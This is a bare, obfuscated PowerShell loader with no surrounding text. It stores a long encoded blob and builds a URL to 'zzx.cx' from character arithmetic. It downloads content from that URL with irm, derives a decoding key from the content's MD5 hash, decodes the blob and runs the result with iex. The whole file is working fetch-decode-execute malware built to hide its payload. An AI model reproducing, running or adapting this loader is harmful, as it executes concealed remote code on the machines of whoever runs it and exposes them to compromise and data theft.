$o='ttpeF1hjFjQDbY9UtoTPb5jrbALdb135FBu3tdkYBIuyB6I4FLUHBSUHBzn3bVi FyH2bkStBKh2BXwfFCoyBzqStCiIBoeQF2WKF izbvj0BU55bMsAt7D0BCkJBTvqtfOFtg6uBddZbnTfFtp-tZZptTeDBuadBmr7FFpgF57hb07hBo-iBbGYbK73tj80bxZqFmNrBrhTbVVDbg DBr Rbabvt0H0bq88BaAMBnblF4VOtwtCFSKAtBfeb36stVBLt76VBcgzbk2itdahF6f2BokCbWlLbiLKtXB9tBEjt1 gb5PRB3l0tt8zBACEtQjVtwTAbMPtBYGtba3BFArKb4WebQIfBR6yFI-JBWDSFCGnbaP-FBheBcaqb7EtbO8YtnO6t1EmB56aifQzt8cwt4tpBkN3BFFOb2HRtudBb7EvBGFytmgjBd1GFuTcBacatEvWFARQi T8tu ft4dVtAmAFQzGFIaVbMF4FfWcbYjiFYOZtMTMtHdgB7OWbRRTBBbZBdzSt3IQFKn5t3GzBTkKi2ZbBlXdFVrct-F5tD7yFbiLtVZrF5ZjBDTUBC4MbpRPBgbobfxWB1IfBceatjO5b67YtSXiFM0btRKSF8QKFAExBL2sbts8FE-BtNVsbhrlBMXVtFbQbxCDFwdJBoC8FHbEtWHZFVWMtLO4F2rLtDiJt7SZt6lgFQx-BkQaB uSbKdZbG0gbQpRBnpMBnSMFMM3FEB7blshtY utr0ztdDHbD0PbI-ZtV88b5VqFYXSBgMStx9Rtz7EFAPdb-xebYNPFFgPbSbrt BQbLjLFoC4FCeVbc2ViSQNFX5oFnJqFOOPBAgebUc8iD8otWbxbSqibOChtO4vFGtYib64b41UBYYSFUeXit7CtouHifRWt4RLbjHEtoUJBCWWbLuLbfHPbRMBt8m5BQ-LtiXyBu5 F7uStczMB-fQtZ5atkKKbj1pbollFA0UFYZ8BQ7fbXvKbsTtF-l9FeipifXyt8Z8bgLNicgGFoSABbfwtVj8tR5wF3SqFDSWBpnVBp1uFe-mb7WYbjUobZtZbGxVtegNtlTiFiTGBOpCteMOFIlOB7MybdKLbPP0tPtebHzKFanoteU2BUT9tDGvFhxrbb1qb5Cst33ZivAptmPftY84bJLHFWnKbHqpb-y0baWqbmjab8cjBE09tU9 tYzbtjIwF2n-tna1t3Ontm8HBrY0B6P7bMKFFIYZFq1Yt9mNFQfEBvCWF-37bzMTFqoMB0HsbdQBblobiBiqbbnqblkztYzbtJUxB3v-BLe0FuX9BYv bhzZbZOOiblVFgActQcptOBrbTWbFW3WF32WBxGKbzQOFvJjFUfxBSCNba1QbZChB11YB676ibZpB6DMBeCJFn 5FuQOtS1Eb8nOtnCMBMQGB 2LbkZpt0WHb7eDb8pht4iEBKx4tAFHbtkUBEFWFAc8FtBWFfCsbbz2B tWtD-zBqmMB5t9B9L7bkCRFFPItVZEBiO3tRkZtTeRBxdGBh88BK rBtRjBkopBgOjbAZeBeEdbuIEFXP3b0G F5QSF87Ht-3ebA6PFPYfF3CztaQpF3C5bUggb6SSble0F JZtnCRF5y3FRMHbblsbn6qBJtIbIXOFZViFIZOBz8vt4qybOhnbHoQttL7bsarbnzRBsBmtOafFae6tZv6FP2HbC9xbq6ObN OFqVCFxFfBE58BHbatEDkta RBVjpBpoubZ7LbfGYBQ0Kt-tNtzWsFIf1iFp3tYS1BC6fiFJpF3JNFgKRbxQLFMAlicYOFPSibvHXF9hoBh1gt550Bv8vbcgDBZrNFOq4tmUJbBY6FLRbBa2VtDRPFXyEFntgFpsZtA-jbVQNt fFtun6tqiBbd8mt4OfteCbb2l1bgnCbcepFKz4B8s5BA81ttOati3aFRHBtLvSF0wNbudBbdQKBbhTtaL6tnmCbnqltQhqtBkrid84tLpptR0pthHzb8kzbhJPtQRhFauqtvt2FYQTBRKybIDgtFS0FSuVFpq0BpYzb84Di eTt3SSBCwMbwiCbFY5FJlWtRNjiBTWtE8KbSzfbhhabsDobc9aBjRTBtyTtRs8bBgTt1sGtphltT-6bhdQitJVb-khBBOQbB9RirtxbPX-B NjFlqkFJd3BAocFlwbBZgeB7RgtnxytlI6tnGpFOpUBi32FwnRi yYtkF6bv dtfhPBvQoto XBQB-FOkStR75bGTKBSU2b8IzFtYxFOiuiEk-t Y9BmNYtj8-t7rhbfkvtH0Ubybqb2-vFf nFBEmF3ijFvL7FcJwB2GfFvqFtFkiFwJYFFCbFAZ1tT1ht3ciF1iMbhSWify4t84ntj9-FOKjFHaVbIVHBw4DFiqBtjZ2tIPABJGdtubGbxrTiBPUFPhZbzEnbZ85F-yrBnmMB tkFaE0t8SWF3e5bD3fiBXFFI0cbFWktzv1B-CvBMlEF5SdBuXcbNTkFcuOtznTivuntwnmbMLXBaRABRGVBG-tiS6Hb9aobasxBBSKFgcEtXMktSCBBMzWtryntRA5FS2ebhxJBec-BQF8BMm2bgeaBz2WB25wiBiMt4Y2FuHHFIGmb7zrFH-FirHLBbT BZ4uBvGWFltSbYY7iD9sBUbniSuptvVGFL9NFNCmbU7bFLkSb6VGFST8tMiPb06tBAS7Bv50t BOFt9PFtVBBiA7b8DeF8-gts5BF1KKBHx5FKXttsqCb5EdtyVGBBvfBfy itkMbFdGb0ggtqzqF3rStPV5BFDXbA2hB4n5tCc3bDN-t8svbTNybWt7bMH2ifTEbG8yBYe7FaVGF0mxFdNvbbGctywpbgKKtmmbtWv9bwFuidunb6zcB4mLtWPlbKUdFnr-B5WHbpewb2uyB4Qot8autNrMFubGbUewtYZNFTjBFD8ftfYabOWYBL1ftKqTbZiPBFbKBjsRFdLiFYFztosvbBG3FO-Jt03eBgeUtmVtb1OPBR5UBf3qtv0attfliEaHBmEqb9XcFJontuvYtN2BtU7Dt4OgF9PgiE5hteN bT1kFP7HFItMbNh8FPYAbgJotaGvFa8lFmeCirlPBiuYBxhmbWmkFu1hFIaJtlxeiDA4icW7Btf-FqYBFXc tUVSFTyKFStytWL3tFuBbGf6tXlnbdCNFY3UBcskBhNxFxkQiGFMBI Gt7wZbMjAFfTFbOz6tGybBwu0t3VobCVftdwybrqzid3TtFBRir1MbegCibH-tp16tedSiENfbSW7FkHFbGuntEHOt-bKtoF7FoEGtoDCii77b 5fifdEbFDrBz3mtOl FcVKFCN1FTFjB63bFtW2FdbhFz5jBzDDb4nkF3b3FuLXbGBRbBHQtt8cb26xFzBSb8aiFi9RFSkmBUb8bLyFbVpmFRM-tFItb6jvb5pNBX47BN-BBpDgBMBcbOLUB0f7bVDgBdOtFDkVb  kBxZStPgFFPK BbcwbJfMbHZzt1WgFXAPFBEOBoOfBC5HFy1ABZzobfEoivdyFGDHBBxNtVggB1fAtxOttEl7FVwWFttht-5NFMwQBTKStubcFfkqt3sdB0ECBleTFDkTFiZOiEBlBXw4tkYxBYbNB5pNFrC7iB9wtkkrtvALF -0b3jWbMBPtjeoidnnF0OWBzWxifSot6-9tOupBplib-nBbbUDbvVtFOMSF2mVt2gcFbEVbfPXF9wub4ZLF9OZidvJboCQtNryB3elb1z0BXXjFZv0BlcpFYWuiB WtbAktiUgtSIot2fbFOAwbqVdBs0TFwiiFmyitC5aBBRVF1V0FzZutTv0BDnuFLeFblgKbL-DB7Z8tdy8FCSgbCQcFssFBTHabK45tc2ttEIOtJgytVcztLuebuGptRVpFnTbBoxAbX 5t9tztzoTF3slB5clFV0qFkCnBcyIt5nLtj0vifarb y6BBvTtdtWtN6GBPBqbRgFbakOtYLWFV7jbfFCFLfMbn30t9SuFm5bFC IbZovB8-XbjOFFdJTBPumFLEVtE9OB5fRBSWuFSNzbVD BJr4FDVntgAzbZ3wiFXZbAnUbjanBx mtoBPbJBLtcIaBW-htOiAFKnOtFmQtcrptDJiF-xQBuG1B- QiEpmtwE9t-ebtonnBpaCb7ZnFkLpb0W9bgfVbb4WBjOwbrcxFnN0F7CNFNsmBUDtiF9-to5ebapRtKTliiUFbYq3bghEbkEGbn9TBRBvtlWWBuR7ByKAFQcHtFy5tCHFiiluFWA2bpyUFqWWbxxzti32FpUjFIg4BG6ktmUibjGBBW0yboiOBSymb6WsFqDYtwtctlw-tJDTBojnb2cOF5HtB43PFxX0FIlIBERABJoXiG0Lthl2BAP7bCbtBZcYtOi0FKUjbJ6QBqSDtZS7BCPpbM-xBqDHF5FpFjP3FdQEBYbNitKbFdijivfBFR6qFhrRFrI2BcRuFlxMbqWgtH1ZB9mMbxwhBUscBv2TtEdQFnqZbbcKFRduFaq0BCHBFl5YF0bFFKJhBtsubW5Nb-PSFStQtsQXB6I-tHONb7gRFkhSt8w7tv3sFlxyts3FBwXItN5VbyS2FTG4t0BqBQh-bIfOtuE7BSqNBW9WtTY6b1FKBynGBukTF9GPibWYt5ZzF5ort4HIbRWsBu3GbrTttPjZtjupifI9FUhCBM1HbhKZBHGIbadrb6bIBQ1ztQkmBg8dBY5QtLRDtqWcicCzBHpyBMiAt-lGFXdHibodF pybFD6t8qxbEsFidDTb1zLbV1YFrNYFrx6BR  bfygbpbbF2BrirnUtllbFk0lFryiBo-QtaSJbcdYb11hFsqfbVP5bH59if0siG2bFH5kBBBAtkCaBvS2bfpKbrc7teyyb8lrFZaiiB6UB3jAbSZnB9yWBgifFG PBVTrBLULB1nuBazGFQ84bhUctpB7trcxbpk2bA1dtc-Bt2NhbAO-Fvj2BMHiB35UBFTUbJ8ptFF-B-mRFRlhbTZ1B u5FpPhtFk-txwntjScbLJZbBYRBFThtCzKBO1wtjDlB7zuFnLOBX--b1dwFUYtbetAFRZmFiukFz9aB8JMboa3bBq4tWVVByoMB5bmBDMwt jItI0SiD5DBWyStSkfBnujbKI-tvFxb8W8B0wsbRBGtHSCBaZ1BwXDF4GxtTW1t8R3Bx5vFAd1BZVqtQF8bKaetYqABRaJbkQabmGFite4FA5NbXBfbUZgBarZbfknbNS9FUTht3IRF6E7tqmUti2ntkx0B1TstyNoBhTktp25Ba6rt2OfFd-ZFKRHBlUetN -bD5Zto02bHBBb6NWBKHSFC3UF-VntDLEtpcxF0AyFOXTBeX-BI8FF1FpifE2iSSdtp5vB2brtW7vFpIPtUCYB35AtQpLBtluF3k9BBlKbrXLbUEbbV4eBVh4B4PeFguAtf5db3Est8kstPUZb3d2ivtYbWyJBgPiFpJrFGlFtVuFbqgsb1coiSOnbDwftXpjtktCBhiFBK-yBD-NFbUrb0y2tDaGbNtrtuMgF3DkF4bHteyIbIJvbdwXFKycb6PnFlo tEvrB4cxbqrKFpU-BuZTFAcmtx5Fb7a2bL-XttpEFxGZB0GdF-4ybvIHFMNZbeYktkBGtlEmF0RABIlat-2ptZ99BiIobx1hFqketwx9B WPbuq4bBtdFb5XbhbGBhDKBUyaBLdYbnq3tpzqB5DIFQGobA7qt9qKB0dTbWSntNW6b0SKbMJeFXKnFdd1bnU6ivAUB7f7bD6Kt6rutxbebPCBFJTVBy2Jtn8dt8QBBIlDBcf5BA2uBUpctELkBxdNF1pgB5W5iruaBAxCBPg2FJoNFRhDF-q1Bs9obaoetUI2F1OhtriVbP-niBYVtAR5F5T9bkTFbTYMFF1gtlEXbdzJFgDDby3 bix4FEMJidkhBczxFZS4FYdJbggNirNdbolMb6jSFoPzFkuPFsHgFWXDFvRYbj48tHItF1J6tlf1BmJNbJfdBRXeBHrVBvgetXPFB8EDtNntbMybbzzAFuXmFZWzbPNDtRIQFAN2FabMbTO5FUrRBMp iBZhbGlhBMWStHvEbfffBc6qB6lab52aFbr2BgtjByjKBWe5bVcCFSzYt6ZEBXenthRrbnckFCoxt9jSFHE8BsB2bKm4iSrvFE4sB-8bFZzQtqrAbzs tS9wtHXctxoZBnxLbtJFBBY2it8DBzuEtPt3FThGt51cid9EB0Hwb0dabcspFa1-F BNtKARtXb9b5CvbLe9Fb9GtoWQFeQybVwcb7JUth4CBhhtBljEFkUyblMrt0aoFJoNBgTybgDQBETGBGfqtQJzt5luBAaLtTAGBem6BzRFBaoNFAeJbGC5BVR-Fw9Ctj1wbl64iSyBFkWnFSeABZ76tTI8F5tOickEbO5cFDw1itbwFnettkqItBkNFLkAtskptrmMbM7lB3FKBgKzFvvlBXoXbKZXtVk7b8yatKmcbZuWFaJ6bkSatUAxtLAnFbNOFwIYF-X FtXOFxZBBmCUF8pPF3VXB7IRBYfpB8zUbG4-F8OHtolStIpUifVSBMzcbXdwFov6FJLjBTn8BWN9FgbUFKodF-YOF69EFraUteS7F3gIBbLctG4KFpL-b-Fgbgzfbqhyt0dsFJUUFJBaitj9bu4rFFb4B7MbtXJVtE3zBF6GF5t1BjgtitZetY2lbFbRFDTMtjSvBvd1Fhi-bc31F8bdBgIwBllsByOzt0M1baXlbVJmi yBt udBmUWtl-UBg4YtHdCFOV0tUurb1BfbTepbIQtbQAlt6LWt71cBhLfFH7SifVjtcxiFyDoFakttJtobIIftj1CBpX0BxQbBhqxtycCBeuLtgaYFyNtFlcUBRB2tB2wt-o9B6d4tQC9tqLXFD4TFzJIB6ycbbwotr3HBAtctnn9BJKsbloBFdortj9TB2n8bSXiBKLnBku5bCsKB qcbDJcF5KNBnXTiSWbbm6BtLPHirtIBaG2BzGdBu5dFW3sF87Xb 7cB9RXb Z8BcV3bYeebqIfbUw3BsTnb8JAtf mFkg3t2 vt2khbZk-bQQkicDYtRIVB3lEBt 9BmoYbIhCbB OBNAMt3SBtChOtOVetyVcFT-3BhRcbz76tVZmttYMb9eyt94ftx5MFuF1BlSwtcEbBeROb9sGFfd8FmfcbCRcbbGkidfSB5wyiF08BqRsB8VMtb1QFR0Jtc UtuEHBycYtH1ct2tXt0 ytU-rFEcotku9bQJxBfIxt71rByGoBWmIFkEkFVaNBVC7bvvlBr6ft 9dtYYciD2wbFxAb0NJBX7WBhHKFx8UtKBwbycibED3t9MeBAdnBajPBVWLtLTsBlLdFTIytL1EtA5AFi39BhyXFvdwBQQAtRaeB 8YFS0EF5N2b0xDbp9 tqKNt-ATFj-BtSSWibWyFGgftDGXBxxOF8TfbQNhbF5Bb9C1BZpmtTbSBn7stwp5BORobvBvtED4BXOgFOlmi2kXBcF4tooNbBVVbcQRFymAteWLta6iF8QCbJ9UtWqLb6ZfBRddtofltnZhFLQVB2CsBYznbhfOtEUqtSIEtDQRB87fBntOtczsBCDzbNdWBCFot8euBmyFbGQ6F75bFFxXFIdJbFaybouTFd15BugEFWsjBnJbBXDWB7Latt piSyQtcm4tyvstGAViB1nFOTAF2S5tggpb3reBiFaB0-MFIcyibwzBOMobwyOtKHVb5ccbiL b CLttLJBckEtSsNFWXmBmfitztlBzMOB2aSt7U4iFfuts7zbO1AtW7qbSLUtDBVBaHFBXX3BsgwB33SbM6ZtC-fFuRSFyKSBX2aBU5mF9iHttbSb6BVb9x0t3DqFVEqbVHDFHKuFQJMB7t-bvsRitBlbAttb5b4BAUTtvFsiBv-bWIvbtntbr1GbifJFuJ0bX4xBl61tN7iFFDqbT3IbC0KBpdDt8aGbj4NthyItKpxBPGMtXGftCOcFngIbSgaBoJ1b-WaBA4LBsKYFeqKFShPB6AZBxXKFdHPFEPPtLaTbR Mbcu3tVW1byJyFh0CFLJatX3dFoJZbsIeb0LtBbbHtKUdBj7FBw1vbWOLbuwMtPO5BB-zbWC0tz9TFTUobP6zFMuBFVpLByPHb9D6bn 3BIaSBHLFtHeCb7PjifN4BHB5bpqnbMeSBm9qb8MYF9uqF32ub8jfi weFUoctOBFivUEtyJ1txpRBlmJt8c7t9t1tMGAFTVht-qntDR4bQ3lFcKhiDOoFXF5F7UDF Y0tU2 tPiobb5dBL91bGzWtiNyBcuzbNhfFwQobpbmFyFQtBT7FFkEt7uftYdvtWRltiIPtZ7FFzqVbgSdBG7HF8yubJfqFMaRFZJdFJUptyIRBqq6F6Q5BsivbeC7t9WCB8hVtojJFathtxZzBE1KBJZ ivrRiiggbjC-B cebXEbBccfFpOmtZkXtVCHtJxFBlkstaryFFDmBA49B1iztV7IBu8lF0mQBRz0F5c1tNRTBFVCBxzFBa5WBxvyFz65B1rOb4d4t9fbbwIBFvhhiE0ub9Mmbbtat1dlBcDqi2JqicrztMpOF5cAtJhDbOyjbM-Sthf9trLcbzvBbxCJFoDlb8egFevSb-phtbXCbDCHtZ3lFRGAbcsztUWyF4VpBetSF19mBVqktgCAiB5PBufwFuSUBC6yFn87bbDvFHN9tZ1gtTWKBHEhbpq3bS37FvyqFeODbEKcBS4QB G7byOlbQLUbv9YtaSLF0t8ib zFdevBb5ZbEb1FY9 itmwFnJvb5e0tSfUF2YaBSv3BZTNF27LFsA4FSO-tmvbBp3stk4itrH1tkF5F8SCF wNFZHwiEclF1dFiFdXirP9bVElBPLcFfOxbYH8F0tmtAsfb45fBNCetQ0kt13AbU0jFR nFMfFFakyBwcxB8BcBHudF7suFnDjtyPaF3XftOZHFP9IFU2ztRyebbubibEoiS32bIKqBx08BiuDFYzxF3jqidPPbDGsbqmwFJ2LtxF8tCfsBwCbt5MIB6TFbKsXB1woFiVcFDVabHuDFVuqBQrqBv7mBUvybKA-tEWFB0LPb0SQtVUytOANBq32tCCUbJxEtsVSbPRZblqntWFbFBAEBcUAidAQFKAeb2XYb0xTbFCZF9umbaXRBHwatSKwBgbRBJrqBrsHtaZxFZERBobGbX3 tKsgFeoctD2SbdqnFLtyB4mhFgHTtysTtOG4FHheB9v4BjH8FsUZFqfCbuH8bbnHb3WABSipFwGOFetCb6WFbKHEFcLptVZKtHzvtCxdBcAKb3DqbA0SFcg5BxiLFhy8blkUBaR8t3bwBSQJtPjGtWV t4U tL9rtvCQtme-t8XSF4TkB7QsbgtftCzkbpMwFaVLF6mjbwPkbh4ttUfgtjFRt7zbB7vrtg8mBKAqt-i9bVuWtNiNtOLzBT8FBrJOBE0bb-UgbqqTBXgKFDDDFUw2t6j8teVGFmnYbWfYF4vTtgF0bkbmBxepbVpOBF95i P-bYs-BRPUBhlXtgBOFELlb9HIbbkyBcIzbgCCFA9LbBuutLA1BpBaitCqBuTZbSYxbV6QBIEabylmiBB2bxrvBYnsiDDjbOobtUJEBfiWFIt-F8CHB4eNbsdPbuVpF595bZvQbVoaBQuqb-sPtdpAF87PtOqSBjzMt9LdtUFStLQztthGBVUttpBsB NBFfQiB-nfB3Vxtd3vicoeibykB WRFNx9F7bnBZYJbuf5t0IbBJJqBU-UFzyYBxzutrInbbTFFj5jFewUFbaHt4mtbl1CbdGPBLFtFI7qFc9pBGRRbDrfBELXif3zFIQNi2QUifmItkI5BBQQiDAibX8Mb-gwFy6hFZS7BcGqbFunFBdhF9wVFtmGbKnpth8sFQyFbivbt TLBSzBtNqYb1Z1bS6jbAgLbyZ9FyLetOgtb05-bzPNtf6mb5p4BQn6BjgcFezCthpOBLlsFjMNidATBymfFlUIBoPftv2Wtrd7BD7gBKiziB3JFhgoba-xtMxpboxct3tDtcqNF9eqtWWFFr0HFw-6FK YBuOXb8-ubmBytXYltS0GtIXyFYqwbNklbO3eF58 tiUxbkOJF3Mdb3-XFA6PbxsCbniSBIfQtmZXbPRAFJbabPP8beOWtQniBe MtplltEfvBxJTb8-rtwIoFC1jtZk9F0titUNvBslmFZCbFEUnFJeHBmUVBxyobgv4bXRlbKJ7bkVAF0afitHhF73qifBqFx47FP0BbwjobuIIbNYLtHeotn YbR73BoYrb2U2tz8CB95jtHhXBSoBtQG6bRB5B3mpB-lnBXb5FaEtFLolBzL1Bs7BBYEJt6ZgbrGViE-etZwliBAMtQTTFEQFidyXFpiktJrPtOk7F1 aB WqbmcTBLbYbZd0iBArbOxcBJ8gbbBhbhHZBIq1BBJTF3Ulb7Nnt66WFBtIBbTFtVHUivNkbI8GF98 B0ddbOsobvBktppqtxamirzEb1jnBAi6B f-bFsIb5h1t6JiF r bs1bFRdwFwuvtDlLbIW F-MithvVtxinFnEpFDnntPg4Fw3Pbud8BPPyBg21Fm-DBAgPBnf9FkVjFIg1FQ6MBgvqb7wvt8GAF1-pbrIPifpxtdIeirwQFbzpt8WEFwknFgB tH0VBjZzblvWBqNtFjy4FKstbYMzbLSPF8QXtRzoiiFFthQLFAoCB57Pth2HF0RUtWTKiBhSbnTNBc9rbPpgi2egFrZGbujobq8wbHw5tnfdFnwtt6hat4gztxwpbMP2FREaBgg6tjggivqwbKFkFZKXtkdJtyTwbtsZbhY2iDO1Bc ebUJXi2MktAlybWXzBI8bFFdNB2gKFSXGF9AlB5RBbF-QtxmwboBYtA8EFtQRb6uWFJXxB2-Sbc1VbxT2tikRF JVbqcRFeKzFxmhtm RthnwFuk2B5JIt9beFcwDt0KdttexBQmXiSXSFbXPbrV F9x-BdqJFm6mbgbBFNM5Bd8aB5HGFZ7stS0vFU95bp4htZRQBHo6FNOcFirPtQZ8FHTYBbs4B5biFSPbbgzuBHiiBQd7bNmktg uBb7XFtATbaaVtykOtkkRFsHItUMliSZntr9fBYWitiYRF1k-iGTgbR3CBaqCFZ- tr4nFhESFQJeBrKNbnCMirkAFHFGtFDWtBEhbyhLt7lktI-EiFlwBYkWBnYwiGe8tl3YtO36B1YybcKUFcDlFBn8B1PdiFu bBWQtI9kBAgsBJccbOHIbRf0FPtTb0eEtGBRB4D5bsDgbf1TtOl FPYPBL0gBrnwByL1b0E0tnuqBf wFhP9BWJctDKGt3LBi2abtSo FtMgBG4xFi kF6ittsh2F0c FImEFmCqFGBBt19KtyjmBp9XFQN9FNBHBELCBfqJtypStwsGbWugFV4GBcFqFaSMb1m-t49ibsHdtIbYbu ZtoTebNy0bLnKtkBBFNUpB8ZzbZ1TBzLoBCQCBTspFiFVBBjfBYrvFnAiFPKCtsHkFpasFAjntDUCBQHjF6LFi2lGBVIOBS3uid6hBdKObon0bLR8BCkDbSQ-b0wJtkTRivhwtz17FBqzt17Ztyumt69tFwAptf TtTMaF9o1BHrHBCwwFemhbplnFkJgiGwwt8dMbyRSBxrfF-d9bmrZb4VQBLz3tZRNFhCsFhllt4gpBZmebndPtLDgtt3TFRFuF2hib5X0Bf53FsQFtYUebeyjiS2fFSAPtdAhtbSFFZgiB-ydtN4lBjp-t88kFkUTtTszbe05bFYdF2Wvb1vPBFEBBaukFuKxbI9pbJJ4FoajFXYbB3EQF39jFIdntvxeFKz3tCd1by9QbuOtFkAni2BYBmezFoUrb4TXbLPNFAPVb5WwBEoWiG76tdqiFMAyFBXJFLa5BSlaitjaBYn4FBCft3CJBuEHF8r tPTote8DBXDoBA8RbRxnFRS3b-5qbpdwFxfQtkIjBOn5FrYBBDhHttbgtYNkFN5mFYvotVAntVUztk5ebCpVB57wbKPTbD8oir9YtmiHbu1JBjreBtwDtMbctCiLtG7RFXIrBw10blzRBJPciE4vBXdvtFCxF9mo';$g=((((4-shl 4)+(3*15))*(2/2))+0); $d="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz -";$k='AxNnRlZFNpR';$md5=[System.Security.Cryptography.MD5CryptoServiceProvider]::Create();$h=$md5.ComputeHash([Text.Encoding]::UTF8.GetBytes((irm ([string]([char](61*2)+[char](61*2)+[char](60*2)+[char](23*2)+[char](33*3)+[char](60*2)+[char](94/2)+[char](35*3)+[char](57*2)+[char](218/2)+[char](21*3)+[char](35*3)+[char](122/2)+[char](7*7))))));$os=[System.BitConverter]::ToUInt32($h,0);$as=[System.BitConverter]::ToUInt32($h,4);$rOffset=New-Object System.Random([int]$os);$rAlpha=New-Object System.Random([int]$as);$a=$d.ToCharArray();for($i=$a.Length-1;$i -gt 0;$i--){$j=$rAlpha.Next(0,$i+1);$t=$a[$i];$a[$i]=$a[$j];$a[$j]=$t};$alpha=-join $a;function Convert-CustomBaseToInt {param($str,$alphabet);$base=$alphabet.Length;$num=0;for($i=0;$i -lt $str.Length;$i++){$digit=$alphabet.IndexOf($str[$i]);$num=$num*$base+$digit};$num};$plain="";for($i=0;$i -lt $o.Length;$i+=4){$block=$o.Substring($i,4);$num=Convert-CustomBaseToInt $block $alpha;$offset=$rOffset.Next(0,1114112);$orig=$num-$offset;while($orig -lt 0){$orig+=1114112};$plain+=[char]$orig};iex $plain;

